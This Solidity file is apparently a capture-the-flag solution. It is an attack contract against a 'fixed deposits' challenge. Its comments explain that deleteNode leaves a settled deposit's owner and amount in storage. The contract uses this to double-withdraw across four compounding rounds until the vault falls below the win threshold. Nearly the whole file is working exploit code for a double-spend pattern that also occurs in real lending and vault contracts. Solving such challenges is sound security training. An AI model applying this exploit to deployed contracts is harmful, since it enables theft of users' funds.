// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Challenge} from "targets/fixed_deposits/src/Challenge.sol";
import {CtfDepositToken} from "targets/fixed_deposits/src/CtfDepositToken.sol";
import {DepositVault} from "targets/fixed_deposits/src/DepositVault.sol";

/// @title AttackFixedDeposits
/// @notice Exploits the broken invariant in Challenge.deleteNode.
///
/// Bug:
///   deleteNode unlinks a node from the sorted linked list but never zeroes out
///   depositsList.deposits[depositId].info.  So after removeCompleted settles a
///   deposit and pays out principal + interest, the storage slot still has a
///   valid owner and a non-zero amount.  withdrawDeposit reads exactly those two
///   fields as its access-control and balance check, so the same principal can be
///   withdrawn a second time — effectively a free double-spend.
///
/// Attack (4 rounds, bounded by MAX_SETTLEMENTS = 4):
///   Round 1: deposit 20 k  → removeCompleted (get ~20 k back) → withdrawDeposit 20 k  → 40 k
///   Round 2: deposit 40 k  → removeCompleted                  → withdrawDeposit 40 k  → 80 k
///   Round 3: deposit 80 k  → removeCompleted                  → withdrawDeposit 80 k  → 160 k
///   Round 4: deposit 160 k → removeCompleted                  → withdrawDeposit 160 k → 320 k
///
///   Vault net: starts 500 k, drained 300 k, ends ~200 k < 250 k threshold → solved.
///
/// Timing trick:
///   The valid() modifier only requires maturity >= block.timestamp, so setting
///   maturity = block.timestamp makes the deposit immediately settleable.
///   Everything executes in a single atomic transaction — no time warp needed.
contract AttackFixedDeposits {
    Challenge public immutable challenge;
    CtfDepositToken public immutable token;
    DepositVault public immutable vault;

    constructor(Challenge _challenge) {
        challenge = _challenge;
        token     = _challenge.token();
        vault     = _challenge.vault();
    }

    /// @notice Pull player tokens, run 4 double-spend rounds, return all tokens to player.
    /// @dev    Caller must have approved this contract for at least their full token balance.
    function attack() external {
        // Pull player's 20 k into this contract so it acts as the depositor.
        uint256 balance = token.balanceOf(msg.sender);
        token.transferFrom(msg.sender, address(this), balance);

        for (uint8 i = 0; i < 4; i++) {
            balance = token.balanceOf(address(this));

            // Deposit IDs are assigned sequentially starting at bytes32(1).
            // Was: tried to read internal nextDepositId — not accessible.
            // Fix: derive the id ourselves since we know the starting state.
            bytes32 depositId = bytes32(uint256(i) + 1);

            // Approve the vault to pull tokens from this contract (registerPayout
            // calls token.transferFrom(msg.sender_of_deposit, vault, amount)).
            token.approve(address(vault), balance);

            // Deposit with maturity = block.timestamp so it is immediately mature.
            // valid() only requires maturity >= block.timestamp — equality passes.
            challenge.deposit(
                address(this),
                balance,
                Challenge.Timestamp.wrap(block.timestamp)
            );

            // removeCompleted: pays principal + interest via vault.release, then
            // deleteNode unlinks the node but leaves info.owner / info.amount intact.
            challenge.removeCompleted();

            // Double-spend: node is gone from the list but storage still shows
            // info.owner == address(this) and info.amount == balance.
            // withdrawDeposit decrements info.amount then calls vault.release again.
            challenge.withdrawDeposit(depositId, balance);
        }

        // Return all drained tokens to the player.
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
